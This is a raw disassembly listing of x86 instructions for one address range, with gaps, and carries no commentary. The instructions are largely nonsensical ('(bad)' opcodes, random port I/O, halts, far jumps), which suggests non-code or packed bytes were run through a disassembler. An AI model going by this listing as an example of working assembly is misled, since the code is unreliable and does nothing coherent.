  42ba7c:	mov    edx,0x1b053706
  42ba81:	jae    0x42ba88
  42ba83:	pushf  
  42ba84:	xchg   edi,eax
  42ba85:	jne    0x42bac5
  42ba87:	dec    ebp
  42ba88:	lea    edi,[ebx-0x18d3cc5f]
  42ba8e:	aam    0x93
  42ba90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba91:	cld    
  42ba92:	cmp    cl,BYTE PTR [edi]
  42ba94:	inc    ebx
  42ba95:	jmp    0x42bb0d
  42ba97:	sbb    BYTE PTR [esi],dl
  42ba99:	cmp    dl,BYTE PTR [edi+edi*4]
  42ba9c:	inc    ebp
  42ba9d:	sbb    al,0x8f
  42ba9f:	xchg   DWORD PTR [ebp+0x59],edx
  42baa2:	sbb    al,0x4b
  42baa4:	or     BYTE PTR [esi+0x20],al
  42baa7:	leave  
  42baa8:	out    0x47,eax
  42baaa:	fdivr  DWORD PTR [eax+0x10]
  42baad:	mov    edi,0x463341e3
  42bab2:	aad    0x7a
  42bab4:	scas   eax,DWORD PTR es:[edi]
  42bab5:	inc    edx
  42bab6:	pop    esp
  42bab7:	inc    eax
  42bab8:	mov    dl,0xe6
  42baba:	dec    edi
  42babb:	pop    edi
  42babc:	mov    dl,0x1e
  42babe:	add    DWORD PTR ds:0xf1757767,ebx
  42bac4:	push   ebx
  42bac5:	ret    0x9727
  42bac8:	into   
  42bac9:	imul   edi,DWORD PTR [ecx+edx*2-0x525f4660],0xfffffff0
  42bad1:	inc    edi
  42bad2:	and    eax,0x49621e90
  42bad7:	jno    0x42badf
  42bad9:	xor    eax,0xf732db0d
  42bade:	pop    ds
  42badf:	(bad)  
  42bae0:	jo     0x42bb0e
  42bae2:	ret    
  42bae3:	push   edi
  42bae4:	add    eax,0x5b044034
  42bae9:	lahf   
  42baea:	push   0x77
  42baec:	aad    0xb2
  42baee:	(bad)  [ebx]
  42baf0:	cmp    edi,DWORD PTR [ecx-0x33]
  42baf3:	pop    ebp
  42baf4:	adc    dl,BYTE PTR [edi]
  42baf6:	inc    eax
  42baf7:	fsubr  QWORD PTR [esp+eiz*8-0x78]
  42bafb:	mov    cl,0xfb
  42bafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bafe:	inc    ecx
  42baff:	push   ebx
  42bb00:	pop    eax
  42bb01:	jmp    0x42baa7
  42bb03:	mov    cl,BYTE PTR [esi-0x32]
  42bb06:	inc    ebp
  42bb07:	out    dx,al
  42bb08:	pop    ds
  42bb09:	popa   
  42bb0a:	pop    ebx
  42bb0b:	retf   
  42bb0c:	sahf   
  42bb0d:	je     0x42bad7
  42bb0f:	pop    ss
  42bb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb11:	out    0x85,al
  42bb13:	sub    dl,BYTE PTR [eax]
  42bb15:	xchg   edx,eax
  42bb16:	ret    
  42bb17:	iret   
  42bb18:	call   DWORD PTR [eax]
  42bb1a:	cmp    ecx,DWORD PTR [ecx-0x74]
  42bb1d:	fldcw  WORD PTR [ebx-0x7ada2813]
  42bb23:	(bad)  
  42bb24:	fwait
  42bb25:	bswap  ebp
  42bb27:	fcomp  st(3)
  42bb29:	mov    esp,0x2b4e8769
  42bb2e:	std    
  42bb2f:	xor    al,al
  42bb31:	cmovge esp,esp
  42bb34:	mov    cl,0x0
	...
  42bb96:	xor    al,0x28
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    ecx,DWORD PTR [ebp-0x202d03fa]
  42bba7:	rol    DWORD PTR [ecx],cl
  42bba9:	add    BYTE PTR [edi],al
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    ch,dl
  42bbaf:	xlat   BYTE PTR ds:[ebx]
  42bbb0:	and    BYTE PTR [esi-0x33],ch
  42bbb3:	inc    eax
  42bbb4:	sub    al,0x57
  42bbb6:	cwde   
  42bbb7:	pop    esp
  42bbb8:	push   0xb
  42bbba:	loopne 0x42bb60
  42bbbc:	push   ecx
  42bbbd:	push   eax
  42bbbe:	cmc    
  42bbbf:	dec    eax
  42bbc0:	add    bh,cl
  42bbc2:	sahf   
  42bbc3:	fistp  QWORD PTR [ebx+ebx*4]
  42bbc6:	pop    edi
  42bbc7:	push   esi
  42bbc8:	push   esi
  42bbc9:	mov    ds:0xf9d0f965,al
  42bbce:	cmp    cl,al
  42bbd0:	jae    0x42bc3e
  42bbd2:	sbb    esi,0xf
  42bbd5:	push   cs
  42bbd6:	gs mov edi,0xa4490607
  42bbdc:	inc    edx
  42bbdd:	push   esp
  42bbde:	mov    ebx,0x224e9829
  42bbe3:	xchg   esi,eax
  42bbe4:	lock (bad) 
  42bbe6:	aas    
  42bbe7:	cmp    esi,esi
  42bbe9:	in     al,dx
  42bbea:	pop    ss
  42bbeb:	push   ecx
  42bbec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbed:	adc    BYTE PTR ds:0x9fdb2c67,ch
  42bbf3:	dec    ebx
  42bbf4:	fistp  QWORD PTR [ecx]
  42bbf6:	push   eax
  42bbf7:	or     DWORD PTR [edi-0x56c75629],0xffffffd8
  42bbfe:	add    cl,BYTE PTR [edi+esi*1]
  42bc01:	and    bl,BYTE PTR [eax+0x57a58e5b]
  42bc07:	xor    al,0xc2
  42bc09:	xor    cl,BYTE PTR [eax]
  42bc0b:	mov    ecx,0xe49f62d5
  42bc10:	(bad)  
  42bc11:	(bad)  
  42bc12:	inc    edi
  42bc13:	je     0x42bbbd
  42bc15:	xlat   BYTE PTR ds:[ebx]
  42bc16:	adc    DWORD PTR [eax-0x5b],ecx
  42bc19:	mov    cl,0xc5
  42bc1b:	dec    ecx
  42bc1c:	cli    
  42bc1d:	mov    dh,0xea
  42bc1f:	popa   
  42bc20:	(bad)  
  42bc21:	xchg   ebx,eax
  42bc22:	dec    edi
  42bc23:	jo     0x42bc99
  42bc25:	fcomip st,st(1)
  42bc27:	and    al,0xe8
  42bc29:	dec    eax
  42bc2a:	push   esi
  42bc2b:	add    al,0xba
  42bc2d:	ret    
  42bc2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc2f:	in     al,0x56
  42bc31:	or     dl,BYTE PTR [eax+0x41]
  42bc34:	dec    DWORD PTR [edi]
  42bc36:	cmp    DWORD PTR [edi-0x75],edx
  42bc39:	pop    edx
  42bc3a:	ror    BYTE PTR [esi+0x546f8817],cl
  42bc40:	sub    DWORD PTR [eax-0x2a],ecx
  42bc43:	aas    
  42bc44:	stos   BYTE PTR es:[edi],al
  42bc45:	sub    DWORD PTR [ecx-0x5c281146],0xcff18398
  42bc4f:	les    esp,FWORD PTR [eax]
  42bc51:	es pop ds
  42bc53:	add    BYTE PTR [ecx+0x10],bl
  42bc56:	sbb    ebx,ebx
  42bc58:	jns    0x42bc71
  42bc5a:	mov    ds:0x89e07830,al
  42bc5f:	aam    0xa2
  42bc61:	pop    ss
  42bc62:	retf   0xa38
  42bc65:	jg     0x42bc88
  42bc67:	fldenv [edi]
  42bc69:	and    al,0x45
  42bc6b:	ins    BYTE PTR es:[edi],dx
  42bc6c:	dec    ecx
  42bc6d:	mov    WORD PTR [eax+0x4ad63631],fs
  42bc73:	ins    BYTE PTR es:[edi],dx
  42bc74:	(bad)
  42bc79:	mov    ebx,ebp
  42bc7b:	jno    0x42bc87
  42bc7d:	mov    esp,0x82320fc4
  42bc82:	add    ebx,DWORD PTR [eax]
  42bc84:	mov    esp,ds
  42bc86:	ret    0xe809
  42bc89:	(bad)  
  42bc8b:	bound  eax,QWORD PTR [ebx]
  42bc8d:	inc    ecx
  42bc8e:	xor    DWORD PTR [eax+0x232f180],0x94955762
  42bc98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc99:	loop   0x42bc27
  42bc9b:	das    
  42bc9c:	ins    BYTE PTR es:[edi],dx
  42bc9d:	or     ecx,edx
  42bc9f:	mov    al,ds:0x35f0bbdb
  42bca4:	pop    esp
  42bca5:	addr16 ja 0x42bcb3
  42bca8:	mov    BYTE PTR [ebp-0x3e3299ce],cl
  42bcae:	cmp    edi,DWORD PTR [esi+eax*1-0x30]
  42bcb2:	mov    ds:0xdf84,eax
	...
  42bd13:	add    BYTE PTR [eax],al
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	fadd   DWORD PTR [ebx-0x71]
  42bd25:	mov    bh,0xe6
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    ch,al
  42bd2f:	and    al,0xff
  42bd31:	adc    ch,BYTE PTR [eax-0x7a]
  42bd34:	adc    BYTE PTR [edi+eax*2-0x16372500],dh
  42bd3b:	push   es
  42bd3c:	mov    edi,0xffb7e1f1
  42bd41:	and    DWORD PTR [edx+0x24],0x30
  42bd45:	xchg   esp,eax
  42bd46:	loope  0x42bd7e
  42bd48:	aad    0xe5
  42bd4a:	pop    ds
  42bd4b:	xchg   edx,eax
  42bd4c:	aaa    
  42bd4d:	cmp    al,0xa1
  42bd4f:	imul   ebp,DWORD PTR [edx+0x13b9242c],0xffffff8e
  42bd56:	ret    0xec7a
  42bd59:	add    esp,DWORD PTR [esi+0x41669521]
  42bd5f:	mov    dh,0xda
  42bd61:	shr    DWORD PTR [edx+0x2709ed11],cl
  42bd67:	cdq    
  42bd68:	dec    ebp
  42bd69:	sub    dh,BYTE PTR [esi]
  42bd6b:	dec    ebx
  42bd6c:	xchg   edx,eax
  42bd6d:	pop    DWORD PTR [ecx-0x62]
  42bd70:	stos   BYTE PTR es:[edi],al
  42bd71:	sbb    esi,eax
  42bd73:	xor    BYTE PTR [eax+0x9],bl
  42bd76:	pop    edx
  42bd77:	mov    WORD PTR [edx],fs
  42bd79:	xchg   edi,eax
  42bd7a:	push   ss
  42bd7b:	push   es
  42bd7c:	ins    BYTE PTR es:[edi],dx
  42bd7d:	jb     0x42bd72
  42bd7f:	mov    al,0x9c
  42bd81:	mov    al,0x2f
  42bd83:	imul   esp,DWORD PTR [ebx+0x3b1fd6d1],0x1630db90
  42bd8d:	out    dx,eax
  42bd8e:	and    BYTE PTR [esi+0x11],0x5a
  42bd92:	inc    eax
  42bd93:	and    DWORD PTR [ebx],edx
  42bd95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd96:	in     eax,0xa9
  42bd98:	mov    al,BYTE PTR [edx-0x2a23c817]
  42bd9e:	cmc    
  42bd9f:	push   0x75
  42bda1:	pop    esi
  42bda2:	loopne 0x42bd9a
  42bda4:	xchg   BYTE PTR [edx+0x32],bl
  42bda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bda8:	test   DWORD PTR [ebx],esi
  42bdaa:	imul   esp,edx,0x63d3c2bb
  42bdb0:	pop    ebp
  42bdb1:	fisubr DWORD PTR [edi+0x3f]
  42bdb4:	loop   0x42bdda
  42bdb6:	xchg   esp,eax
  42bdb7:	or     ebx,DWORD PTR [edi-0x5123239a]
  42bdbd:	cmp    eax,0x87709f15
  42bdc2:	repnz dec edi
  42bdc4:	add    esi,DWORD PTR [esi-0x62abaeb6]
  42bdca:	sub    ecx,DWORD PTR [edi+eax*4+0x7942316e]
  42bdd1:	mov    eax,DWORD PTR [eax]
  42bdd3:	in     al,dx
  42bdd4:	lahf   
  42bdd5:	mov    ebp,0x3410ecf1
  42bdda:	sar    BYTE PTR [eax-0x7513f2c7],1
  42bde0:	cmp    eax,0x8a024506
  42bde5:	fdiv   DWORD PTR [eax]
  42bde7:	cdq    
  42bde8:	and    esp,eax
  42bdea:	not    dl
  42bdec:	xchg   ebp,eax
  42bded:	xchg   edi,eax
  42bdee:	scas   eax,DWORD PTR es:[edi]
  42bdef:	or     dl,BYTE PTR [esi]
  42bdf1:	dec    eax
  42bdf2:	fs xchg ebx,eax
  42bdf4:	jno    0x42be56
  42bdf6:	or     DWORD PTR ds:0xa4e0a805,ebx
  42bdfc:	sub    BYTE PTR [ebx],ah
  42bdfe:	dec    ecx
  42bdff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be00:	mov    esp,0x29d48c02
  42be05:	mov    al,0xee
  42be07:	sub    al,al
  42be09:	xor    al,0x82
  42be0b:	xor    ch,BYTE PTR [edx]
  42be0d:	dec    esp
  42be0e:	mov    dl,0xf9
  42be10:	cmp    al,0x25
  42be12:	pop    ebx
  42be13:	fcomp  DWORD PTR [esi]
  42be15:	imul   ecx,DWORD PTR [ecx],0x1f71650f
  42be1b:	daa    
  42be1c:	sar    BYTE PTR [ecx-0x5a],cl
  42be1f:	jnp    0x42be23
  42be21:	js     0x42be59
  42be23:	xchg   esi,eax
  42be24:	mov    ecx,0x8e321df0
  42be29:	xchg   edi,eax
  42be2a:	adc    bl,BYTE PTR [eax+edx*4]
  42be2d:	test   esp,ebp
  42be2f:	std    
  42be30:	mov    ds:0x4b0f3e4d,al
	...
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fisttp QWORD PTR [esi+edx*1]
  42bea4:	call   0x218abb3
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [eax],dl
  42beaf:	and    ebp,DWORD PTR [ebx+0xc]
  42beb2:	mov    edx,0xac69cb98
  42beb7:	xor    eax,0x9efda7df
  42bebc:	outs   dx,DWORD PTR ds:[esi]
  42bebd:	sbb    esi,DWORD PTR [ebx+0x5f842503]
  42bec3:	bound  ebp,QWORD PTR [ecx-0x14c9de36]
  42bec9:	mov    al,ds:0x461da05e
  42bece:	retf   0x1947
  42bed1:	ret    0x9199
  42bed4:	imul   ebx,esi,0x49
  42bed7:	aaa    
  42bed8:	rol    edx,cl
  42beda:	adc    eax,0x7ff94d19
  42bedf:	inc    ebx
  42bee0:	push   edi
  42bee1:	sub    al,0xde
  42bee3:	in     al,dx
  42bee4:	and    DWORD PTR [ebx],ecx
  42bee6:	jnp    0x42bf4a
  42bee8:	jne    0x42bf40
  42beea:	add    DWORD PTR [edi+edx*8+0x66566fa2],ebx
  42bef1:	in     al,dx
  42bef2:	mov    esp,0xfb641b7c
  42bef7:	data16 or BYTE PTR ds:0xda88f08f,bh
  42befe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42beff:	loope  0x42bef3
  42bf01:	enter  0xdfe4,0xf3
  42bf05:	pop    eax
  42bf06:	fldcw  WORD PTR [ecx+0x768083fa]
  42bf0c:	out    dx,al
  42bf0d:	xchg   esi,eax
  42bf0e:	fisub  WORD PTR [ecx+ecx*2+0xcc25add]
  42bf15:	psllw  mm7,mm5
  42bf18:	daa    
  42bf19:	mov    al,ds:0xee3b30d5
  42bf1e:	adc    BYTE PTR [ebx+0x54e8425f],0xf3
  42bf25:	(bad)  
  42bf26:	mov    eax,0x8cf7b831
  42bf2b:	loope  0x42bed7
  42bf2d:	add    DWORD PTR [edx-0x6d213eb7],esp
  42bf33:	(bad)  
  42bf34:	fld    DWORD PTR [edi+0xd13566e]
  42bf3a:	xor    esp,esp
  42bf3c:	cmp    al,0xa5
  42bf3e:	mul    ecx
  42bf40:	(bad)  
  42bf41:	jae    0x42bfb5
  42bf43:	xchg   esi,eax
  42bf44:	inc    esi
  42bf45:	dec    esi
  42bf46:	inc    esp
  42bf47:	jb     0x42bf01
  42bf49:	int3   
  42bf4a:	push   eax
  42bf4b:	jne    0x42bf40
  42bf4d:	mov    ebp,0x8c63c8aa
  42bf52:	inc    ebp
  42bf53:	jmp    0x42bfb2
  42bf55:	sbb    BYTE PTR [ecx-0x56e0ce22],cl
  42bf5b:	into   
  42bf5c:	jp     0x42bfc3
  42bf5e:	ret    0xdfd8
  42bf61:	mov    ebp,0x928999b0
  42bf66:	mov    edi,0x18646541
  42bf6b:	adc    DWORD PTR [ebx+0x3a],esi
  42bf6e:	jno    0x42bfbc
  42bf70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf71:	xchg   BYTE PTR [ecx+0x5e],bl
  42bf74:	mul    DWORD PTR [esi+0x7951d851]
  42bf7a:	icebp  
  42bf7b:	(bad)  
  42bf7c:	loopne 0x42bf80
  42bf7e:	add    BYTE PTR [edi-0x51fcf3e6],bl
  42bf84:	pop    esi
  42bf85:	pop    ebx
  42bf86:	mov    esi,0x53b67f5e
  42bf8b:	dec    edx
  42bf8c:	and    BYTE PTR [ebx],al
  42bf8e:	mov    al,0xcc
  42bf90:	outs   dx,DWORD PTR ds:[esi]
  42bf91:	mov    eax,ebx
  42bf93:	and    ch,BYTE PTR [ebp-0x38b8c5e]
  42bf99:	in     eax,0x58
  42bf9b:	stos   DWORD PTR es:[edi],eax
  42bf9c:	leave  
  42bf9d:	mov    ebx,0xf548c399
  42bfa2:	pop    edx
  42bfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfa4:	lea    ebp,ss:[ecx]
  42bfa7:	push   ebx
  42bfa8:	jb     0x42c008
  42bfaa:	frstpm(287 only) 
  42bfac:	imul   ebp,esi,0xffffffb7
  42bfaf:	mov    bl,BYTE PTR [esi+ebx*4+0xf92084]
	...
  42c016:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0x7a9ff806
  42c024:	out    0xb9,eax
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [eax+0x3c],dh
  42c030:	pop    ebx
  42c031:	aaa    
  42c032:	jle    0x42bfb6
  42c034:	test   al,0xc1
  42c036:	pop    eax
  42c037:	cli    
  42c038:	inc    ebx
  42c039:	stos   BYTE PTR es:[edi],al
  42c03a:	les    ebp,FWORD PTR [ecx+0x35]
  42c03d:	mov    dl,0xd1
  42c03f:	in     eax,0xe4
  42c041:	test   al,0xfe
  42c043:	mov    edi,0x2b6d2ec
  42c048:	or     cl,bh
  42c04a:	xchg   ecx,eax
  42c04b:	sbb    eax,0x82036d37
  42c050:	and    eax,0xc5a5570c
  42c055:	repnz imul esp,ebp,0xd467dcef
  42c05c:	mov    BYTE PTR [ecx+edx*1+0x78e70d6f],ah
  42c063:	mov    esi,0x582598bf
  42c068:	xchg   edi,eax
  42c069:	mov    al,0x44
  42c06b:	xchg   ebx,eax
  42c06c:	jno    0x42c0bf
  42c06e:	pop    ebx
  42c06f:	adc    DWORD PTR [eax],esi
  42c071:	sbb    dl,BYTE PTR cs:[edi]
  42c074:	and    edx,esp
  42c076:	push   ecx
  42c077:	cwde   
  42c078:	or     edi,DWORD PTR [ebp-0x4bbd261c]
  42c07e:	pop    esp
  42c07f:	adc    DWORD PTR [ebx+0xeb93217],ebx
  42c085:	jno    0x42c0ab
  42c087:	pop    edx
  42c088:	pop    ds
  42c089:	sub    DWORD PTR [edi],ebx
  42c08b:	jmp    FWORD PTR [ebp-0x33fdd91e]
  42c091:	pop    ss
  42c092:	push   edx
  42c093:	sub    DWORD PTR [eax],esi
  42c095:	es mov esp,0x61babfa3
  42c09b:	jg     0x42c110
  42c09d:	ins    DWORD PTR es:[edi],dx
  42c09e:	push   es
  42c09f:	mov    esi,0x37735c7d
  42c0a4:	mov    ch,0x7
  42c0a6:	in     al,0xff
  42c0a8:	add    eax,0x55f5f97f
  42c0ad:	in     eax,0x80
  42c0af:	test   eax,0xaebbaa40
  42c0b4:	inc    ecx
  42c0b5:	fst    DWORD PTR [ebx-0x1b0ab9f4]
  42c0bb:	pop    esp
  42c0bc:	push   esi
  42c0bd:	adc    ch,0xdc
  42c0c0:	adc    BYTE PTR ds:0x7d69e6d6,cl
  42c0c6:	hlt    
  42c0c7:	call   0xd5d6dc5a
  42c0cc:	jmp    0x42c0fb
  42c0ce:	push   ds
  42c0cf:	jo     0x42c0bf
  42c0d1:	mov    ebx,0xf3a1acbb
  42c0d6:	push   ss
  42c0d7:	add    ebx,DWORD PTR [eax]
  42c0d9:	out    dx,eax
  42c0da:	(bad)  
  42c0db:	repnz cmp dl,dl
  42c0de:	stos   BYTE PTR es:[edi],al
  42c0df:	in     al,0x98
  42c0e1:	sti    
  42c0e2:	mov    ch,0xba
  42c0e4:	sar    bl,cl
  42c0e6:	pop    esp
  42c0e7:	cmp    al,0xa3
  42c0e9:	pop    ebx
  42c0ea:	sub    esp,0xffffffbb
  42c0ed:	mov    eax,ss:0x9de2f08b
  42c0f3:	lahf   
  42c0f4:	sub    edi,DWORD PTR [eax]
  42c0f6:	add    dl,ch
  42c0f8:	lea    eax,[edi]
  42c0fa:	ret    0xa230
  42c0fd:	nop
  42c0fe:	push   0xfd64479e
  42c103:	arpl   sp,cx
  42c105:	xchg   edx,eax
  42c106:	jo     0x42c136
  42c108:	nop
  42c109:	ins    DWORD PTR es:[edi],dx
  42c10a:	rol    al,cl
  42c10c:	jge    0x42c142
  42c10e:	push   0xc
  42c110:	call   0xad08dbd9
  42c115:	push   es
  42c116:	fadd   QWORD PTR [edi]
  42c118:	sub    ecx,DWORD PTR [edx-0x5380221f]
  42c11e:	or     DWORD PTR [eax],0xd8ff2a4e
  42c124:	cmp    ebx,eax
  42c126:	dec    ebx
  42c127:	scas   al,BYTE PTR es:[edi]
  42c128:	sub    al,BYTE PTR [edi]
  42c12a:	out    dx,al
  42c12b:	mov    dh,0xcf
  42c12d:	imul   edi,DWORD PTR [ebp-0x3ee50b01],0x4
  42c134:	sbb    DWORD PTR [eax],eax
	...
  42c196:	imul   eax,DWORD PTR [edx-0x10105133],0x3fa4c76b
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	leave  
  42c1a3:	sub    eax,0xd7fb9a60
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    bl,bl
  42c1af:	inc    ebx
  42c1b0:	sbb    al,0x29
  42c1b2:	mov    ?,esi
  42c1b4:	pop    ds
  42c1b5:	cmp    BYTE PTR [esi],dh
  42c1b7:	mov    cl,0x57
  42c1b9:	ror    ecx,0x4a
  42c1bc:	nop
  42c1bd:	inc    edi
  42c1be:	and    edi,DWORD PTR [ecx]
  42c1c0:	add    al,0x3c
  42c1c2:	and    DWORD PTR [eax-0x3aff7ddc],ebp
  42c1c8:	in     al,0x2f
  42c1ca:	jmp    0x42c20c
  42c1cc:	lock and DWORD PTR [ebx+eiz*2],edi
  42c1d0:	cmc    
  42c1d1:	cmp    eax,0xd7927990
  42c1d6:	imul   ebx,DWORD PTR [esi-0x19b8226a],0x26d5a65a
  42c1e0:	cmp    esi,DWORD PTR [ecx+0x647282e7]
  42c1e6:	mov    ebp,0x9db4199a
  42c1eb:	stc    
  42c1ec:	mov    ecx,0x944d3871
  42c1f1:	lods   eax,DWORD PTR ds:[esi]
  42c1f2:	lahf   
  42c1f3:	retf   0xc1e5
  42c1f6:	add    cl,ch
  42c1f8:	bound  ecx,QWORD PTR [esi-0x59]
  42c1fb:	mov    eax,ds:0xb60ec9f2
  42c200:	push   0xfffffffa
  42c202:	sub    DWORD PTR [ebx+eax*1-0x314dfa56],eax
  42c209:	mov    DWORD PTR [ebp-0x75515cfd],ebx
  42c20f:	push   0xbce9f7e2
  42c214:	pop    eax
  42c215:	test   DWORD PTR [esi-0x51],0x1befa49c
  42c21c:	push   ds
  42c21d:	dec    ebx
  42c21e:	mov    esp,0x8abf6cb7
  42c223:	and    eax,0xf9120de9
  42c228:	adc    dl,BYTE PTR [ecx]
  42c22a:	out    dx,eax
  42c22b:	pop    esi
  42c22c:	xchg   ebp,eax
  42c22d:	xchg   ecx,eax
  42c22e:	cmp    eax,0x563e6d9a
  42c234:	popw   ds
  42c236:	push   es
  42c237:	(bad)  
  42c238:	dec    ebp
  42c239:	jl     0x42c22b
  42c23b:	dec    eax
  42c23c:	lea    edi,[ecx+0x50]
  42c23f:	out    dx,al
  42c240:	sub    al,al
  42c242:	inc    ebp
  42c243:	hlt    
  42c244:	pop    edi
  42c245:	inc    ebp
  42c246:	loope  0x42c1e9
  42c248:	mov    ?,WORD PTR [esi-0x70]
  42c24b:	pop    ss
  42c24c:	xchg   esp,eax
  42c24d:	cmp    DWORD PTR [ebp+eiz*2-0x23ae3160],ebx
  42c254:	sbb    edi,ebp
  42c256:	out    dx,eax
  42c257:	xchg   ebx,eax
  42c258:	mov    esi,0xc2caae13
  42c25d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c25e:	or     eax,0x6cd9a35f
  42c263:	icebp  
  42c264:	push   cs
  42c265:	lahf   
  42c266:	sbb    eax,0x155faccf
  42c26b:	and    eax,0xdb743ba1
  42c270:	(bad)  
  42c271:	in     eax,0xe1
  42c273:	mov    ah,0x20
  42c275:	push   ds
  42c276:	and    DWORD PTR gs:[ebx],ebx
  42c279:	sti    
  42c27a:	scas   al,BYTE PTR es:[edi]
  42c27b:	xor    eax,0xec2bdc4e
  42c280:	inc    esp
  42c281:	je     0x42c247
  42c283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c285:	neg    BYTE PTR [edx+0x30a0fad4]
  42c28b:	stos   DWORD PTR es:[edi],eax
  42c28c:	mov    cl,0xe4
  42c28e:	repz stc 
  42c290:	lock fsub QWORD PTR [esi]
  42c293:	add    BYTE PTR [ebx+0x7b],0x4
  42c297:	xor    DWORD PTR [esi-0x47de5cb],eax
  42c29d:	and    DWORD PTR [edx-0x3dba9129],eax
  42c2a3:	sahf   
  42c2a4:	inc    ebp
  42c2a5:	dec    edx
  42c2a6:	mov    cl,0xe3
  42c2a8:	popf   
  42c2a9:	sub    DWORD PTR [edi],0xffffffb4
  42c2ac:	adc    eax,DWORD PTR [ebx+0x5d6469e5]
  42c2b2:	adc    DWORD PTR ds:0xc9,esp
	...
  42c314:	add    BYTE PTR [eax],al
  42c316:	out    0xf,al
  42c318:	fldcw  WORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    ecx,DWORD PTR [edx]
  42c323:	push   ebp
  42c324:	test   al,bl
  42c326:	add    bl,cl
  42c328:	add    DWORD PTR [eax],eax
  42c32a:	pop    es
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    dl,ch
  42c32f:	cmp    esi,DWORD PTR [esi-0x11]
  42c332:	fidivr WORD PTR [esi+eiz*4]
  42c335:	in     eax,dx
  42c336:	dec    esi
  42c337:	jle    0x42c32e
  42c339:	and    eax,0x8e4236b2
  42c33e:	mov    esi,0x3839e17c
  42c343:	add    BYTE PTR fs:[esi],bh
  42c346:	dec    ebx
  42c347:	rcl    DWORD PTR [esi-0x4],0x95
  42c34b:	add    BYTE PTR [esi-0x43569a76],dl
  42c351:	cli    
  42c352:	stos   BYTE PTR es:[edi],al
  42c353:	cwde   
  42c354:	std    
  42c355:	fldenv [edx+0x6c]
  42c358:	mov    dh,BYTE PTR [eax+0x6d]
  42c35b:	pop    ebp
  42c35c:	push   cs
  42c35d:	jmp    0x14a6:0x2add90b6
  42c364:	adc    esi,ebp
  42c366:	dec    esp
  42c367:	rcr    BYTE PTR [eax],1
  42c369:	adc    ebp,DWORD PTR [ecx+ebp*4]
  42c36c:	sub    al,0xc5
  42c36e:	inc    esi
  42c36f:	sbb    ebp,DWORD PTR [esi-0x5d]
  42c372:	retf   0x2b3e
  42c375:	add    al,bh
  42c377:	repz pop esi
  42c379:	push   ebx
  42c37a:	xor    al,0xc2
  42c37c:	inc    edi
  42c37d:	hlt    
  42c37e:	push   ebp
  42c37f:	cmp    BYTE PTR [ebx-0x3d],0x48
  42c383:	pop    esi
  42c384:	pop    ecx
  42c385:	sar    DWORD PTR es:[esp+edx*4],cl
  42c389:	shr    BYTE PTR [edx],0xda
  42c38c:	adc    cl,BYTE PTR [esi+edi*4]
  42c38f:	jl     0x42c3d7
  42c391:	cmp    DWORD PTR [ebx+ecx*2-0x5dc31191],edi
  42c398:	dec    ebx
  42c399:	ja     0x42c3f1
  42c39b:	dec    ebx
  42c39c:	scas   al,BYTE PTR es:[edi]
  42c39d:	mov    esp,0xdc90e8f1
  42c3a2:	scas   al,BYTE PTR es:[edi]
  42c3a3:	pop    ebx
  42c3a4:	jno    0x42c420
  42c3a6:	or     edi,DWORD PTR [esi]
  42c3a8:	sub    esp,DWORD PTR [ecx]
  42c3aa:	push   0xffffffb9
  42c3ac:	adc    edi,DWORD PTR [ebx]
  42c3ae:	push   0x2a39a141
  42c3b3:	mov    ch,0xaa
  42c3b5:	cwde   
  42c3b6:	das    
  42c3b7:	cli    
  42c3b8:	mov    ebp,0xf65914f9
  42c3bd:	push   0xef7e8c1f
  42c3c2:	or     BYTE PTR [ecx-0x131265f4],dh
  42c3c8:	idiv   bh
  42c3ca:	push   edx
  42c3cb:	(bad)  
  42c3cc:	pop    ebp
  42c3cd:	sub    eax,0x74996979
  42c3d2:	push   edx
  42c3d3:	pop    edi
  42c3d4:	jnp    0x42c39c
  42c3d6:	cmp    BYTE PTR [ebx-0x77],dh
  42c3d9:	popa   
  42c3da:	fucomi st,st(3)
  42c3dc:	repz out 0xe7,eax
  42c3df:	add    edi,0x13577a88
  42c3e5:	mov    al,ds:0xa69ec2e9
  42c3ea:	das    
  42c3eb:	push   ebp
  42c3ec:	sahf   
  42c3ed:	mov    dh,0x6
  42c3ef:	mov    dl,0xce
  42c3f1:	ins    BYTE PTR es:[edi],dx
